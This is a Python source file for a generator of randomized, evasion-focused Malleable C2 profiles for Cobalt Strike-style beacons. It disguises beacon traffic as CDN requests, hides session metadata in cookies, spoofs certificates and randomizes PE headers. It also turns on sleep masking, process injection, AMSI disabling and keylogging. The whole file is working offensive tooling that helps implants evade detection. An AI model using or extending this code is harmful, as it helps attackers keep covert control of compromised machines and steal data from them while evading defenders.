"""
Polymorphic Malleable C2 Profile Generator
Inspired by SourcePoint, C2concealer, and OpenMalleableC2.
Dynamically crafts customized, randomized, evasion-focused Malleable C2 profiles.
"""

import random
import string
from typing import Dict, Any, Optional, List
from backend.models import (
    Profile, HttpTransaction, ClientSubBlock, ServerSubBlock,
    TransformBlock, TransformAction, TerminationAction,
    Header, Parameter, StageBlock, ProcessInjectBlock, PostExBlock, HttpsCertificate
)
from backend.wordlists import (
    USER_AGENTS, SERVICE_TEMPLATES_DATA, SAFE_SPAWNTO_X86, SAFE_SPAWNTO_X64, NAMED_PIPES
)


def _rand_str(length: int = 8, chars: str = string.ascii_letters + string.digits) -> str:
    return "".join(random.choice(chars) for _ in range(length))


def _rand_hex(bytes_count: int = 4) -> str:
    return "".join(f"{random.randint(0, 255):02x}" for _ in range(bytes_count))


class ProfileGenerator:
    """Polymorphic generator creating realistic, evasion-tuned Malleable C2 profiles."""

    def __init__(self):
        pass

    def generate(
        self,
        template_key: str = "amazon_cloudfront",
        sleeptime: int = 5000,
        jitter: int = 25,
        evasion_level: str = "stealth",  # "standard", "stealth", "paranoid"
        custom_host: Optional[str] = None,
        custom_useragent: Optional[str] = None,
        allocator: str = "VirtualAllocEx",
        use_ntmap: bool = False
    ) -> Profile:
        tpl = SERVICE_TEMPLATES_DATA.get(template_key, SERVICE_TEMPLATES_DATA["amazon_cloudfront"])

        profile = Profile()
        profile.name = f"{tpl['service_name']} - {evasion_level.upper()}"
        profile.sleeptime = sleeptime
        profile.jitter = jitter
        profile.data_jitter = random.randint(10, 30)

        # User-Agent
        if custom_useragent:
            profile.useragent = custom_useragent
        else:
            profile.useragent = random.choice(USER_AGENTS)

        # Named pipes
        pipe_base = random.choice(NAMED_PIPES)
        profile.pipename = pipe_base
        profile.pipename_stager = f"status_{_rand_str(4)}##"
        profile.sample_name = f"update_{_rand_str(6)}.exe"

        # Host
        host = custom_host if custom_host else tpl["host"]

        # Build HTTP-GET
        get_tx = HttpTransaction(verb="GET")
        get_uris = random.sample(tpl["get_uris"], k=min(2, len(tpl["get_uris"])))
        get_tx.uris = get_uris

        # Client GET Headers
        client_get = ClientSubBlock()
        client_get.headers.append(Header("Host", host))
        for h_name, h_val in tpl["headers"]:
            client_get.headers.append(Header(h_name, h_val))

        # Metadata transform block (Beacon -> C2 server heartbeat/task request)
        tb_meta = TransformBlock(block_type="metadata")
        tb_meta.transforms.append(TransformAction("mask"))
        tb_meta.transforms.append(TransformAction("base64url"))

        prefix_param = random.choice(tpl["params"])
        if evasion_level in ("stealth", "paranoid"):
            # Hide metadata inside Cookie or specific parameter
            tb_meta.transforms.append(TransformAction("prepend", f"{prefix_param}="))
            tb_meta.termination = TerminationAction("header", "Cookie")
        else:
            tb_meta.termination = TerminationAction("parameter", prefix_param)
        client_get.transform_blocks["metadata"] = tb_meta
        get_tx.client = client_get

        # Server GET Output (C2 Server -> Beacon tasking)
        server_get = ServerSubBlock()
        server_get.headers.append(Header("Server", tpl["server_header"]))
        server_get.headers.append(Header("Content-Type", "application/octet-stream" if "cf" in template_key else "application/json"))
        server_get.headers.append(Header("Cache-Control", "no-cache, no-store, must-revalidate"))

        tb_server_out = TransformBlock(block_type="output")
        tb_server_out.transforms.append(TransformAction("mask"))
        tb_server_out.transforms.append(TransformAction("base64"))
        tb_server_out.termination = TerminationAction("print")
        server_get.output = tb_server_out
        get_tx.server = server_get

        profile.http_get = get_tx

        # Build HTTP-POST (Beacon data exfil / task results)
        post_tx = HttpTransaction(verb="POST")
        post_uris = random.sample(tpl["post_uris"], k=min(2, len(tpl["post_uris"])))
        post_tx.uris = post_uris

        client_post = ClientSubBlock()
        client_post.headers.append(Header("Host", host))
        for h_name, h_val in tpl["headers"]:
            if h_name != "Accept":
                client_post.headers.append(Header(h_name, h_val))
        client_post.headers.append(Header("Content-Type", "application/x-www-form-urlencoded" if evasion_level == "standard" else "application/json"))

        # ID block (Beacon session identifier)
        tb_id = TransformBlock(block_type="id")
        tb_id.transforms.append(TransformAction("mask"))
        tb_id.transforms.append(TransformAction("base64url"))
        id_param = random.choice(["session", "sync_id", "token", "cid"])
        tb_id.termination = TerminationAction("parameter", id_param)
        client_post.transform_blocks["id"] = tb_id

        # Output block (Post data / response)
        tb_post_out = TransformBlock(block_type="output")
        tb_post_out.transforms.append(TransformAction("mask"))
        tb_post_out.transforms.append(TransformAction("base64url" if evasion_level != "standard" else "base64"))
        tb_post_out.termination = TerminationAction("print")
        client_post.transform_blocks["output"] = tb_post_out
        post_tx.client = client_post

        # Server POST Output
        server_post = ServerSubBlock()
        server_post.headers.append(Header("Server", tpl["server_header"]))
        server_post.headers.append(Header("Content-Type", "application/json"))
        tb_srv_post_out = TransformBlock(block_type="output")
        tb_srv_post_out.transforms.append(TransformAction("mask"))
        tb_srv_post_out.transforms.append(TransformAction("base64"))
        tb_srv_post_out.termination = TerminationAction("print")
        server_post.output = tb_srv_post_out
        post_tx.server = server_post

        profile.http_post = post_tx

        # STAGE Block Configuration
        stage = StageBlock()
        stage.checksum = 0
        stage.cleanup = True
        stage.sleep_mask = True
        stage.smartinject = True
        stage.stomppe = True
        stage.obfuscate = True
        stage.userwx = False  # Avoid RWX permissions!

        # Randomized PE and MZ headers
        magic_tag = _rand_str(2, string.ascii_uppercase)
        stage.magic_mz_x86 = f"MZ{magic_tag}"
        stage.magic_mz_x64 = f"MZ{magic_tag}"
        stage.magic_pe = f"P{_rand_str(1, string.ascii_uppercase)}"

        # NOP sled or polymorphic shellcode prepend
        nops = "\\x90" * random.choice([4, 8, 12])
        stage.transform_x86_prepend = nops
        stage.transform_x64_prepend = nops
        profile.stage = stage

        # PROCESS-INJECT Configuration
        pi = ProcessInjectBlock()
        pi.allocator = "NtMapViewOfSection" if use_ntmap else allocator
        pi.min_alloc = random.choice([4096, 8192, 16384])
        pi.startrwx = False
        pi.userwx = False
        pi.execute_order = [
            "CreateThread", "SetThreadContext", "CreateRemoteThread", "RtlCreateUserThread"
        ]
        profile.process_inject = pi

        # POST-EX Configuration
        pe = PostExBlock()
        pe.spawnto_x86 = random.choice(SAFE_SPAWNTO_X86)
        pe.spawnto_x64 = random.choice(SAFE_SPAWNTO_X64)
        pe.amsi_disable = True
        pe.keylogger = "GetAsyncKeyState"
        profile.post_ex = pe

        # HTTPS Certificate Configuration
        cert_data = tpl["cert"]
        cert = HttpsCertificate()
        cert.CN = cert_data["CN"]
        cert.O = cert_data["O"]
        cert.OU = cert_data["OU"]
        cert.C = cert_data["C"]
        cert.ST = cert_data["ST"]
        cert.L = cert_data["L"]
        cert.validity = random.randint(365, 730)
        profile.https_cert = cert

        return profile
